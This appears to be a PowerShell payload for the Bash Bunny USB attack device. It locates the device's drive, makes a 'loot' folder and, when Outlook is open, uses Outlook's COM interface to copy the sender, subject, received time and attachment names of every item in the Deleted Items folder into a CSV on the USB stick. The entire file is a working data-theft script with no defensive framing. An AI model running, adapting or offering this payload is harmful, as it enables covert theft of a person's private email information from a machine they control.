#Get the path and file name that you are using for output
# find connected bashbunny drive:
$VolumeName = "bashbunny"
$computerSystem = Get-CimInstance CIM_ComputerSystem
$backupDrive = $null
get-wmiobject win32_logicaldisk | % {
    if ($_.VolumeName -eq $VolumeName) {
        $backupDrive = $_.DeviceID
    }
}

#See if a loot folder exist in usb. If not create one
$TARGETDIR = $backupDrive + "\loot"
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

#See if a info folder exist in loot folder. If not create one
$TARGETDIR = $backupDrive + "\loot\OutlookDeleted"
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

#Create a path that will be used to make the file
$datetime = get-date -f yyyy-MM-dd_HH-mm
$backupPath = $backupDrive + "\loot\OutlookDeleted\"

#Create output from info script
$TARGETDIR = $MyInvocation.MyCommand.Path
$TARGETDIR = $TARGETDIR -replace ".......$"
cd $TARGETDIR

if (get-process -EA "SilentlyContinue" outlook | where {$_.ProcessName -eq "Outlook"})
{
Add-type -assembly "Microsoft.Office.Interop.Outlook" | out-null
$olFolders = "Microsoft.Office.Interop.Outlook.olDefaultFolders" -as [type] 
$outlook = new-object -comobject outlook.application
$namespace = $outlook.GetNameSpace("MAPI")
$Deleted = $namespace.getDefaultFolder($olFolders::olFolderDeletedItems)
$Deleted.items |Select-Object -Property Sendername,Subject,ReceivedTime,@{name="Attachments";expression={$_.Attachments|%{$_.DisplayName}}} | export-csv $backupPath\OutlookDeleted-$datetime.csv
}
